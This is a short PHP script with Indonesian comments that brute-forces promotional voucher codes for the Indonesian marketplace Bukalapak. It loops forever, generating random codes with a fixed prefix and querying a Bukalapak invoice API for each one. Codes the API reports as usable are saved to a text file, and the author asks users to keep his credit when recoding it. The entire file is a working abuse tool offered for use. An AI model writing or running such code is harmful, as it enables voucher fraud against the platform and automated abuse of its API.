<?php
error_reporting(0);

/******

	Created by Fariz Rifqi

	Thanks To:
		[*] SGBTeam Tercintah
		[*] http://api-siptruk.c9users.io
		[*] Obet.me
		[*] Stackoverflow

	
	Jangan hapus credit. Tambahkan saja creditnya kalau ngerecode
	
******/
function generateRandomString($length = 4) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return "BLMOIV".$randomString;
}
function save($file, $code){
file_put_contents($file, $code, FILE_APPEND);
}

function check($code, $file){
$check = file_get_contents("https://api.bukalapak.com/v2/invoices/vp_purchase_info.json?package_id=1470&type=phone_credit&voucher_code=".$code."&phone_number=&virtual_account_type=&payment_method=alfamart");
$decodecheck = json_decode($check);
if ($decodecheck->message == "Voucher hanya berlaku untuk pembelian Produk Fisik"){
	save($file, $code."\n");
	$result = array("status" => "sukses", "code" => $code);
}else{
	$result = array("status" => "gagal", "code" => $code);
}
return $result;
}

while(true){
	$file = "voc_bl.txt";
		$code = generateRandomString();
        $check = check($code, $file);
		if ($check['status'] == "sukses"){
			echo "[\e[0;32m".$code."\e[0m] VALID & TERSIMPAN DI ".$file."\n";
			sleep(5); // MOHON UNTUK TIDAK DIHAPUS!
		}else{
			echo "[\e[0;31m".$code."\e[0m] INVALID\n";
		}
}
?>